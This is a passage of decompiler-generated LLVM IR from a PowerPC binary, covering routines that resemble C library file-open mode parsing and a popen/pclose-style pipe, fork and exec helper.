  br i1 %tmp8, label %dec_label_pc_10004eb4, label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004ea0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10004eb4

dec_label_pc_10004eb4:                            ; preds = %dec_label_pc_10004ea0, %dec_label_pc_10004eb0
  store i32 ptrtoint ([3 x i8]* @global_var_100091f8.205 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* @r29, align 4
  %v1_10004ec8 = load i32, i32* @r31, align 4
  %v2_10004ec8 = add i32 %v1_10004ec8, 4
  %v3_10004ec8 = inttoptr i32 %v2_10004ec8 to i32*
  store i32 -1, i32* %v3_10004ec8, align 4
  %v2_10004ecc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004ecc, i32* @r30, align 4
  store i32 %v2_10004ecc, i32* @r3, align 4
  %v0_10004edc = call i32 @function_10009200()
  %v0_10004ee4 = call i32 @function_100091f8()
  %v3_10004eec = load i32, i32* @global_var_10010494.207, align 4
  store i32 %v2_10004ecc, i32* @r3, align 4
  %v1_10004ef8 = add i32 %v3_10004eec, 1
  store i32 %v1_10004ef8, i32* @global_var_10010494.207, align 4
  %v0_10004f00 = call i32 @function_10009200()
  %v0_10004f04 = load i32, i32* @r31, align 4
  %v1_10004f04 = inttoptr i32 %v0_10004f04 to i16*
  %v2_10004f04 = load i16, i16* %v1_10004f04, align 2
  %v3_10004f04 = zext i16 %v2_10004f04 to i32
  %v0_10004f08 = load i32, i32* @r28, align 4
  %v3_10004f08 = icmp eq i32 %v0_10004f08, 0
  store i1 %v3_10004f08, i1* %cr7_eq.global-to-local, align 1
  %v1_10004f0c = call i32 @__asm_rlwinm(i32 %v3_10004f04, i32 0, i32 17, i32 18)
  %v1_10004f14 = or i32 %v1_10004f0c, 48
  %v1_10004f18 = trunc i32 %v1_10004f14 to i16
  %v2_10004f18 = load i32, i32* @r31, align 4
  %v3_10004f18 = inttoptr i32 %v2_10004f18 to i16*
  store i16 %v1_10004f18, i16* %v3_10004f18, align 2
  %v0_10004f1c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f1c, label %dec_label_pc_10004f20, label %dec_label_pc_10004f2c

dec_label_pc_10004f20:                            ; preds = %dec_label_pc_10004eb4
  %v2_10004f20 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004f20, i32* @r3, align 4
  %v0_10004f28 = call i32 @function_10009200()
  br label %dec_label_pc_10004f2c

dec_label_pc_10004f2c:                            ; preds = %dec_label_pc_10004eb4, %dec_label_pc_10004f20
  %v0_10004f2c = load i32, i32* @r31, align 4
  %v1_10004f2c = inttoptr i32 %v0_10004f2c to i16*
  %v2_10004f2c = load i16, i16* %v1_10004f2c, align 2
  %v1_10004f30 = and i16 %v2_10004f2c, 16384
  %v3_10004f30 = icmp eq i16 %v1_10004f30, 0
  br i1 %v3_10004f30, label %dec_label_pc_10004f40, label %dec_label_pc_10004f38

dec_label_pc_10004f38:                            ; preds = %dec_label_pc_10004f2c
  %v1_10004f38 = add i32 %v0_10004f2c, 8
  %v2_10004f38 = inttoptr i32 %v1_10004f38 to i32*
  %v3_10004f38 = load i32, i32* %v2_10004f38, align 4
  store i32 %v3_10004f38, i32* @r3, align 4
  store i32 268455744, i32* @lr, align 4
  %v0_10004f3c = call i32 @function_100081f8()
  br label %dec_label_pc_10004f40

dec_label_pc_10004f40:                            ; preds = %dec_label_pc_10004f2c, %dec_label_pc_10004f38
  store i32 %v2_10004ecc, i32* @r3, align 4
  %v0_10004f4c = call i32 @function_10009200()
  %v0_10004f54 = call i32 @function_100091f8()
  %v3_10004f5c = load i32, i32* @global_var_10010498.208, align 4
  store i32 %v2_10004ecc, i32* @r3, align 4
  %v1_10004f68 = add i32 %v3_10004f5c, 1
  store i32 %v1_10004f68, i32* @global_var_10010498.208, align 4
  %v0_10004f70 = call i32 @function_10009200()
  store i32 268455800, i32* @lr, align 4
  %v0_10004f74 = call i32 @function_10006b3c()
  %v0_10004f7c = load i32, i32* @r27, align 4
  ret i32 %v0_10004f7c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10004f40, { 1, 0 }
  uselistorder label %dec_label_pc_10004f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10004eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e84, { 1, 0 }
}

define i32 @function_10004f90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004f90:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10004f98 = call i32 @function_10005434(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10004f98
}

define i32 @function_10004f9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004f9c:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_10004fa8 = call i32 @function_10005038()
  ret i32 %v0_10004fa8
}

define i32 @function_10004fac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004fac:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10004fcc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10004fcc, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000501c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000501c, i32* %stack_var_-96, align 4
  store i32 268455976, i32* @lr, align 4
  %v0_10005024 = call i32 @function_10005038()
  ret i32 %v0_10005024
}

define i32 @function_10005038() local_unnamed_addr {
dec_label_pc_10005038:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10005044 = load i32, i32* @r4, align 4
  store i32 %v0_10005044, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10005060 = load i32, i32* @r3, align 4
  %v1_10005060 = sub i32 -1, %v0_10005060
  store i32 %v1_10005060, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10005060, i32* %r31.global-to-local, align 4
  %v2_10005074 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10005074, i32* @r3, align 4
  %v0_10005078 = load i32, i32* @r5, align 4
  store i32 %v0_10005078, i32* %r29.global-to-local, align 4
  %v0_1000507c = load i32, i32* @r6, align 4
  store i32 %v0_1000507c, i32* @r28, align 4
  store i32 268456076, i32* @lr, align 4
  %v0_10005088 = call i32 @function_10005764()
  %v0_1000508c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000508c = load i32, i32* @r27, align 4
  %v3_1000508c = icmp ugt i32 %v0_1000508c, %v1_1000508c
  %v0_10005090 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005090, i32* @r4, align 4
  %v0_10005094 = load i32, i32* @r28, align 4
  store i32 %v0_10005094, i32* @r5, align 4
  %v2_10005098 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10005098, i32* @r3, align 4
  br i1 %v3_1000508c, label %dec_label_pc_100050a4, label %dec_label_pc_100050a8

dec_label_pc_100050a4:                            ; preds = %dec_label_pc_10005038
  store i32 %v1_1000508c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005038, %dec_label_pc_100050a4
  %v1_100050a8 = phi i32 [ %v0_1000508c, %dec_label_pc_10005038 ], [ %v1_1000508c, %dec_label_pc_100050a4 ]
  %v0_100050a8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268456136, i32* @lr, align 4
  %v0_100050c4 = call i32 @function_10005984()
  %v0_100050c8 = load i32, i32* @r30, align 4
  %v3_100050c8 = icmp eq i32 %v0_100050c8, 0
  br i1 %v3_100050c8, label %dec_label_pc_100050f0, label %dec_label_pc_100050d0

dec_label_pc_100050d0:                            ; preds = %dec_label_pc_100050a8
  %v4_100050dc = icmp eq i32 %v1_100050a8, 0
  %v1_100050d8 = sext i1 %v4_100050dc to i32
  %v0_100050e4.v0_100050a8 = add i32 %v0_100050a8, %v1_100050d8
  %stack_var_-88.0 = inttoptr i32 %v0_100050e4.v0_100050a8 to i8*
  %v0_100050ec = load i32, i32* @r26, align 4
  %v1_100050ec = trunc i32 %v0_100050ec to i8
  store i8 %v1_100050ec, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_100050f0

dec_label_pc_100050f0:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_100050d0
  ret i32 %v0_100050c4

; uselistorder directives
  uselistorder i32 %v0_10005060, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_100050f0, { 1, 0 }
  uselistorder label %dec_label_pc_100050a8, { 1, 0 }
}

define i32 @function_10005104(i32 %arg1) local_unnamed_addr {
dec_label_pc_10005104:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.210 to i32), i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v2_10005128 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10005128, i32* @r3, align 4
  %v0_10005130 = call i32 @function_10009200()
  %v0_10005138 = call i32 @function_100091f8()
  %v3_10005140 = load i32, i32* @global_var_10010490.211, align 4
  store i32 %v3_10005140, i32* %r29.global-to-local, align 4
  %v3_10005144 = icmp eq i32 %v3_10005140, 0
  br i1 %v3_10005144, label %dec_label_pc_100051a0, label %dec_label_pc_1000514c

dec_label_pc_1000514c:                            ; preds = %dec_label_pc_10005104
  %v1_1000514c = add i32 %v3_10005140, 4
  %v2_1000514c = inttoptr i32 %v1_1000514c to i32*
  %v3_1000514c = load i32, i32* %v2_1000514c, align 4
  %v1_10005150 = load i32, i32* @r31, align 4
  %v4_10005150 = icmp eq i32 %v3_1000514c, %v1_10005150
  br i1 %v4_10005150, label %dec_label_pc_10005158, label %dec_label_pc_1000517c

dec_label_pc_10005158:                            ; preds = %dec_label_pc_1000514c
  %v1_10005158 = inttoptr i32 %v3_10005140 to i32*
  %v2_10005158 = load i32, i32* %v1_10005158, align 4
  store i32 %v2_10005158, i32* @global_var_10010490.211, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_10005164:                            ; preds = %dec_label_pc_1000517c
  %v0_10005164 = call i32 @function_10004e38()
  %v2_1000516c = inttoptr i32 %v0_10005164 to i32*
  store i32 22, i32* %v2_1000516c, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_10005174:                            ; preds = %dec_label_pc_100051c8
  %v3_10005174 = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_100051f4

dec_label_pc_1000517c:                            ; preds = %dec_label_pc_1000514c, %dec_label_pc_1000518c
  %v1_1000519c = phi i32 [ %v2_10005180, %dec_label_pc_1000518c ], [ %v3_10005140, %dec_label_pc_1000514c ]
  %v1_10005180 = inttoptr i32 %v1_1000519c to i32*
  %v2_10005180 = load i32, i32* %v1_10005180, align 4
  store i32 %v2_10005180, i32* %r29.global-to-local, align 4
  %v3_10005184 = icmp eq i32 %v2_10005180, 0
  br i1 %v3_10005184, label %dec_label_pc_10005164, label %dec_label_pc_1000518c

dec_label_pc_1000518c:                            ; preds = %dec_label_pc_1000517c
  %v1_1000518c = add i32 %v2_10005180, 4
  %v2_1000518c = inttoptr i32 %v1_1000518c to i32*
  %v3_1000518c = load i32, i32* %v2_1000518c, align 4
  %v4_10005190 = icmp eq i32 %v3_1000518c, %v1_10005150
  br i1 %v4_10005190, label %dec_label_pc_10005198, label %dec_label_pc_1000517c

dec_label_pc_10005198:                            ; preds = %dec_label_pc_1000518c
  %v1_10005198 = inttoptr i32 %v2_10005180 to i32*
  %v2_10005198 = load i32, i32* %v1_10005198, align 4
  store i32 %v2_10005198, i32* %v1_10005180, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_100051a0:                            ; preds = %dec_label_pc_10005104, %dec_label_pc_10005164, %dec_label_pc_10005158, %dec_label_pc_10005198
  store i32 %v2_10005128, i32* @r3, align 4
  %v0_100051a8 = call i32 @function_10009200()
  %v0_100051ac = load i32, i32* %r29.global-to-local, align 4
  %v3_100051ac = icmp eq i32 %v0_100051ac, 0
  br i1 %v3_100051ac, label %dec_label_pc_100051f4, label %dec_label_pc_100051b4

dec_label_pc_100051b4:                            ; preds = %dec_label_pc_100051a0
  store i32 %v0_100051ac, i32* @r3, align 4
  %v1_100051b8 = add i32 %v0_100051ac, 8
  %v2_100051b8 = inttoptr i32 %v1_100051b8 to i32*
  %v3_100051b8 = load i32, i32* %v2_100051b8, align 4
  store i32 %v3_100051b8, i32* %r29.global-to-local, align 4
  store i32 268456384, i32* @lr, align 4
  %v0_100051bc = call i32 @function_100081f8()
  %v0_100051c0 = load i32, i32* @r31, align 4
  store i32 268456392, i32* @lr, align 4
  %v1_100051c4 = inttoptr i32 %v0_100051c0 to i16*
  %v2_100051c4 = call i32 @function_10004e44(i16* %v1_100051c4)
  %v2_100051c8 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_100051c8

dec_label_pc_100051c8:                            ; preds = %dec_label_pc_100051e0, %dec_label_pc_100051b4
  %v0_100051d0 = load i32, i32* @r29, align 4
  store i32 268456408, i32* @lr, align 4
  %v3_100051d4 = call i32 @function_10004dc8(i32 %v0_100051d0, i32 %v2_100051c8, i32 0)
  %tmp8 = icmp sgt i32 %v3_100051d4, -1
  br i1 %tmp8, label %dec_label_pc_10005174, label %dec_label_pc_100051e0

dec_label_pc_100051e0:                            ; preds = %dec_label_pc_100051c8
  %v0_100051e0 = call i32 @function_10004e38()
  %v1_100051e4 = inttoptr i32 %v0_100051e0 to i32*
  %v2_100051e4 = load i32, i32* %v1_100051e4, align 4
  %v3_100051e8 = icmp eq i32 %v2_100051e4, 4
  br i1 %v3_100051e8, label %dec_label_pc_100051c8, label %dec_label_pc_100051f4

dec_label_pc_100051f4:                            ; preds = %dec_label_pc_100051e0, %dec_label_pc_100051a0, %dec_label_pc_10005174
  %storemerge = phi i32 [ %v3_10005174, %dec_label_pc_10005174 ], [ -1, %dec_label_pc_100051a0 ], [ -1, %dec_label_pc_100051e0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_100051ac, { 1, 0, 2 }
  uselistorder i32 %v2_10005180, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_100051a0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000517c, { 1, 0 }
}

define i32 @function_10005208(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005208:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1000521c = load i8, i8* %arg2, align 1
  %v3_10005224 = icmp eq i8 %v3_1000521c, 119
  br i1 %v3_10005224, label %dec_label_pc_10005254, label %dec_label_pc_1000522c

dec_label_pc_1000522c:                            ; preds = %dec_label_pc_10005208
  %v3_1000522c = icmp eq i8 %v3_1000521c, 114
  br i1 %v3_1000522c, label %dec_label_pc_1000525c, label %dec_label_pc_1000523c

dec_label_pc_1000523c:                            ; preds = %dec_label_pc_1000522c
  %v0_1000523c = call i32 @function_10004e38()
  %v2_1000524c = inttoptr i32 %v0_1000523c to i32*
  store i32 22, i32* %v2_1000524c, align 4
  br label %dec_label_pc_1000541c

dec_label_pc_10005254:                            ; preds = %dec_label_pc_10005208
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000525c

dec_label_pc_1000525c:                            ; preds = %dec_label_pc_1000522c, %dec_label_pc_10005254
  %v0_10005324 = phi i32 [ 0, %dec_label_pc_10005254 ], [ 1, %dec_label_pc_1000522c ]
  store i32 12, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005264.214 to i32), i32* @lr, align 4
  %v0_10005260 = call i32 @function_100080a0()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %v0_10005260, i32* %r9.global-to-local, align 4
  %v3_10005268 = icmp eq i32 %v0_10005260, 0
  br i1 %v3_10005268, label %dec_label_pc_1000541c, label %dec_label_pc_10005278

dec_label_pc_10005278:                            ; preds = %dec_label_pc_1000525c
  %v2_10005278 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10005278, i32* %r29.global-to-local, align 4
  store i32 268456580, i32* @lr, align 4
  %v2_10005280 = call i32 @function_1000994c(i32 %v2_10005278, i32 %v0_10005260)
  %v3_10005284 = icmp eq i32 %v2_10005280, 0
  br i1 %v3_10005284, label %dec_label_pc_1000528c, label %dec_label_pc_1000540c

dec_label_pc_1000528c:                            ; preds = %dec_label_pc_10005278
  store i32 %v0_10005324, i32* %r9.global-to-local, align 4
  %v0_10005290 = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_10005324
  %v1_10005294 = and i32 %tmp, 4
  %v1_10005298 = xor i32 %v1_10005294, 4
  %v0_1000529c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000529c = add i32 %v0_1000529c, %v1_10005298
  %v3_1000529c = inttoptr i32 %v2_1000529c to i32*
  %v4_1000529c = load i32, i32* %v3_1000529c, align 4
  %v2_100052a8 = add i32 %v0_1000529c, %v1_10005294
  %v3_100052a8 = inttoptr i32 %v2_100052a8 to i32*
  %v4_100052a8 = load i32, i32* %v3_100052a8, align 4
  store i32 268456632, i32* @lr, align 4
  %v4_100052b4 = call i32 @function_10009c08(i32 %v4_1000529c, i32 %v0_10005290, i32 %v0_10005324)
  %v3_100052b8 = icmp eq i32 %v4_100052b4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_100052b8, label %dec_label_pc_100052c4, label %dec_label_pc_100052d8

dec_label_pc_100052c4:                            ; preds = %dec_label_pc_1000528c
  store i32 268456652, i32* @lr, align 4
  %v1_100052c8 = call i32 @function_10004ab4(i32 %v4_1000529c)
  store i32 ptrtoint (i32* @global_var_100052d4.215 to i32), i32* @lr, align 4
  %v1_100052d0 = call i32 @function_10004ab4(i32 %v4_100052a8)
  br label %dec_label_pc_1000540c

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_1000528c
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.210 to i32), i32* %r29.global-to-local, align 4
  %v2_100052ec = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_100052ec, i32* @r3, align 4
  %v0_100052f0 = call i32 @function_10009200()
  %v0_100052f8 = call i32 @function_100091f8()
  store i32 %v0_100052f8, i32* @r3, align 4
  store i32 268456704, i32* @lr, align 4
  %v1_100052fc = call i32 @function_10009550(i32 %v0_100052f8)
  store i32 %v1_100052fc, i32* %r30.global-to-local, align 4
  %v3_10005300 = icmp eq i32 %v1_100052fc, 0
  %v0_10005304 = call i32 @__asm_mfcr()
  store i32 %v0_10005304, i32* %r29.global-to-local, align 4
  br i1 %v3_10005300, label %dec_label_pc_1000530c, label %dec_label_pc_1000538c

dec_label_pc_1000530c:                            ; preds = %dec_label_pc_100052d8
  store i32 268456724, i32* @lr, align 4
  %v1_10005310 = call i32 @function_10004ab4(i32 %v4_1000529c)
  store i32 %v0_10005324, i32* %r9.global-to-local, align 4
  %v4_1000531c = icmp eq i32 %v4_100052a8, %v0_10005324
  br i1 %v4_1000531c, label %dec_label_pc_10005338, label %dec_label_pc_10005324

dec_label_pc_10005324:                            ; preds = %dec_label_pc_1000530c
  store i32 268456752, i32* @lr, align 4
  %v2_1000532c = call i32 @function_100096cc(i32 %v4_100052a8, i32 %v0_10005324)
  store i32 268456760, i32* @lr, align 4
  %v1_10005334 = call i32 @function_10004ab4(i32 %v4_100052a8)
  br label %dec_label_pc_10005338

dec_label_pc_10005338:                            ; preds = %dec_label_pc_1000530c, %dec_label_pc_10005324
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_10010490.211, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_100053544 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100053544, label %dec_label_pc_1000535c, label %dec_label_pc_10005344

dec_label_pc_10005344:                            ; preds = %dec_label_pc_10005338, %dec_label_pc_10005344
  %v0_10005344 = phi i32 [ %storemerge, %dec_label_pc_10005344 ], [ %storemerge1, %dec_label_pc_10005338 ]
  %v1_10005344 = add i32 %v0_10005344, 4
  %v2_10005344 = inttoptr i32 %v1_10005344 to i32*
  %v3_10005344 = load i32, i32* %v2_10005344, align 4
  store i32 %v3_10005344, i32* %r9.global-to-local, align 4
  %v1_10005348 = add i32 %v3_10005344, 4
  %v2_10005348 = inttoptr i32 %v1_10005348 to i32*
  %v3_10005348 = load i32, i32* %v2_10005348, align 4
  store i32 268456784, i32* @lr, align 4
  %v1_1000534c = call i32 @function_10004ab4(i32 %v3_10005348)
  %v0_10005350 = load i32, i32* %r29.global-to-local, align 4
  %v1_10005350 = inttoptr i32 %v0_10005350 to i32*
  %storemerge = load i32, i32* %v1_10005350, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10005354 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005354, label %dec_label_pc_1000535c, label %dec_label_pc_10005344

dec_label_pc_1000535c:                            ; preds = %dec_label_pc_10005344, %dec_label_pc_10005338
  %v8_10005380 = call i32 @function_10008e5c(i32 ptrtoint ([8 x i8]* @global_var_1000e59c.218 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e5a4.219 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e5a8.220 to i32), i32 %arg1, i32 0)
  %v1_10005388 = call i32 @function_10009690(i32 127)
  br label %dec_label_pc_1000538c

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_100052d8, %dec_label_pc_1000535c
  store i32 %v2_100052ec, i32* @r3, align 4
  %v0_10005398 = call i32 @function_10009200()
  store i32 268456868, i32* @lr, align 4
  %v1_100053a0 = call i32 @function_10004ab4(i32 %v4_100052a8)
  %v0_100053a4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100053a4 = call %0 @__asm_mtcrf(i32 128, i32 %v0_100053a4)
  %v2_100053a4 = extractvalue %0 %v1_100053a4, 0
  %v4_100053a4 = extractvalue %0 %v1_100053a4, 2
  %v2_100053a8 = or i1 %v4_100053a4, %v2_100053a4
  br i1 %v2_100053a8, label %dec_label_pc_10005404, label %dec_label_pc_100053ac

dec_label_pc_100053ac:                            ; preds = %dec_label_pc_1000538c
  store i32 %v0_10005260, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.210 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_100052ec, i32* @r3, align 4
  %v0_100053bc = load i32, i32* %r30.global-to-local, align 4
  %v2_100053bc = add i32 %v0_10005260, 8
  %v3_100053bc = inttoptr i32 %v2_100053bc to i32*
  store i32 %v0_100053bc, i32* %v3_100053bc, align 4
  store i32 %v4_100052b4, i32* %r11.global-to-local, align 4
  %v1_100053c8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100053c8 = add i32 %v1_100053c8, 4
  %v3_100053c8 = inttoptr i32 %v2_100053c8 to i32*
  store i32 %v4_100052b4, i32* %v3_100053c8, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_100053d4 = call i32 @function_10009200()
  %v0_100053dc = call i32 @function_100091f8()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100053e4 = load i32, i32* @global_var_10010490.211, align 4
  store i32 %v2_100052ec, i32* @r3, align 4
  store i32 %v0_10005260, i32* %r11.global-to-local, align 4
  %v2_100053f4 = inttoptr i32 %v0_10005260 to i32*
  store i32 %v3_100053e4, i32* %v2_100053f4, align 4
  %v0_100053f8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100053f8, i32* @global_var_10010490.211, align 4
  %v0_100053fc = call i32 @function_10009200()
  br label %dec_label_pc_1000541c

dec_label_pc_10005404:                            ; preds = %dec_label_pc_1000538c
  store i32 268456972, i32* @lr, align 4
  %v1_10005408 = inttoptr i32 %v4_100052b4 to i16*
  %v2_10005408 = call i32 @function_10004e44(i16* %v1_10005408)
  br label %dec_label_pc_1000540c

dec_label_pc_1000540c:                            ; preds = %dec_label_pc_10005278, %dec_label_pc_100052c4, %dec_label_pc_10005404
  store i32 %v0_10005260, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005414.223 to i32), i32* @lr, align 4
  %v0_10005410 = call i32 @function_100081f8()
  br label %dec_label_pc_1000541c

dec_label_pc_1000541c:                            ; preds = %dec_label_pc_1000525c, %dec_label_pc_100053ac, %dec_label_pc_1000523c, %dec_label_pc_1000540c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000525c ], [ 0, %dec_label_pc_1000540c ], [ %v4_100052b4, %dec_label_pc_100053ac ], [ 0, %dec_label_pc_1000523c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_100052b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_100052a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_10005260, { 4, 1, 0, 3, 2, 5, 6, 7 }
  uselistorder i32 %v0_10005324, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 7, 8, 3, 4, 5, 6 }
  uselistorder i32* @global_var_10010490.211, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000541c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000540c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000538c, { 1, 0 }
  uselistorder label %dec_label_pc_10005344, { 1, 0 }
  uselistorder label %dec_label_pc_10005338, { 1, 0 }
  uselistorder label %dec_label_pc_1000525c, { 1, 0 }
}

define i32 @function_10005434(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10005434:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10005434 = load i32, i32* @lr, align 4
  store i32 %v0_10005434, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10005448 = load i32, i32* @r5, align 4
  store i32 %v0_10005448, i32* @r31, align 4
  %v0_1000544c = load i32, i32* @r6, align 4
  store i32 %v0_1000544c, i32* @r29, align 4
  %v3_10005450 = load i8, i8* %arg2, align 1
  %v4_10005450 = zext i8 %v3_10005450 to i32
  store i32 %v4_10005450, i32* %r0.global-to-local, align 4
  %v3_10005454 = icmp eq i8 %v3_10005450, 114
  br i1 %v3_10005454, label %dec_label_pc_100054a0, label %dec_label_pc_1000545c

dec_label_pc_1000545c:                            ; preds = %dec_label_pc_10005434
  %v3_1000545c = icmp eq i8 %v3_10005450, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000545c, label %dec_label_pc_100054a4, label %dec_label_pc_10005468

dec_label_pc_10005468:                            ; preds = %dec_label_pc_1000545c
  %v3_10005468 = icmp eq i8 %v3_10005450, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10005468, label %dec_label_pc_100054a4, label %dec_label_pc_10005474

dec_label_pc_10005474:                            ; preds = %dec_label_pc_10005534, %dec_label_pc_10005504, %dec_label_pc_10005468
  %v0_10005474 = call i32 @function_10004e38()
  %v0_10005478 = load i32, i32* @r31, align 4
  %v3_10005478 = icmp eq i32 %v0_10005478, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10005480 = inttoptr i32 %v0_10005474 to i32*
  store i32 22, i32* %v2_10005480, align 4
  br i1 %v3_10005478, label %dec_label_pc_100056d4, label %dec_label_pc_10005488

dec_label_pc_10005488:                            ; preds = %dec_label_pc_10005568, %dec_label_pc_10005474
  %v0_10005488 = load i32, i32* @r31, align 4
  %v1_10005488 = inttoptr i32 %v0_10005488 to i16*
  %v2_10005488 = load i16, i16* %v1_10005488, align 2
  %v3_10005488 = zext i16 %v2_10005488 to i32
  store i32 %v3_10005488, i32* %r0.global-to-local, align 4
  %v1_1000548c = and i32 %v3_10005488, 8192
  store i32 %v1_1000548c, i32* %r9.global-to-local, align 4
  %v3_1000548c = icmp eq i32 %v1_1000548c, 0
  store i1 %v3_1000548c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000548c, label %dec_label_pc_100056d4, label %dec_label_pc_10005494

dec_label_pc_10005494:                            ; preds = %dec_label_pc_10005488
  store i32 %v0_10005488, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000549c.224 to i32), i32* @lr, align 4
  %v0_10005498 = call i32 @function_100081f8()
  br label %dec_label_pc_100056d4

